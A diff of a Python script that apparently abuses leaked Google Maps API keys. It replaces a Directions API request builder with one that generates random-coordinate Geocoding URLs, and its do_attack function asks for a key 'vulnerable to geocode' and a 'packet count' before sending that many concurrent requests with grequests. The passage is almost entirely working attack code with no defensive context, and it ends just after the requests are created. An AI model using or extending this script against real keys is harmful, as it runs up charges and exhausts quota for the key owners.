@@ -6,35 +6,20 @@ colorama.init(autoreset=True)
 def exception_handler(request, exception):
     print(Fore.RED + "Request Failed.")
 
-def get_searchterm():
-    city1 = open("datasets/cities.txt","r")
-    city_line1 = next(city1)
-
-    city2 = open("datasets/cities.txt","r")
-    city_line2 = next(city2)
-
-    for i, c_line1 in enumerate(city1,2):
-        if random.randrange(i):
-            continue
-        city_line1 = c_line1
-
-    for j, c_line2 in enumerate(city2,2):
-        if random.randrange(j):
-            continue
-        city_line2 = c_line2
-
-    return f"destination=side_of_road:{city_line1.strip()}&origin={city_line2.strip()}"
-
-def generate_url(apikey, term):
-    return f"https://maps.googleapis.com/maps/api/directions/json?{term}&key={apikey}"
+def generate_url(apikey):
+    lat_a = random.randrange(-89,90)
+    lat_b = random.randrange(0,100000)
+    lng_a = random.randrange(-89,90)
+    lng_b = random.randrange(0,100000)
+    return f"https://maps.googleapis.com/maps/api/geocode/json?latlng={lat_a}.{lat_b},{lng_a}.{lng_b}&key={apikey}"
 
 def do_attack():
-    apikey = str(input("Enter Google Maps API Key that vulnerable to advanced directions: "))
+    apikey = str(input("Enter Google Maps API Key that vulnerable to geocode: "))
     count = int(input("Enter packet count: "))
     print (Fore.GREEN + "[+] Sending Packets")
     urls = list()
     for i in range(count):
-        url = generate_url(apikey, get_searchterm())
+        url = generate_url(apikey)
         urls.append(url)
 
     responses = (grequests.get(u) for u in urls)
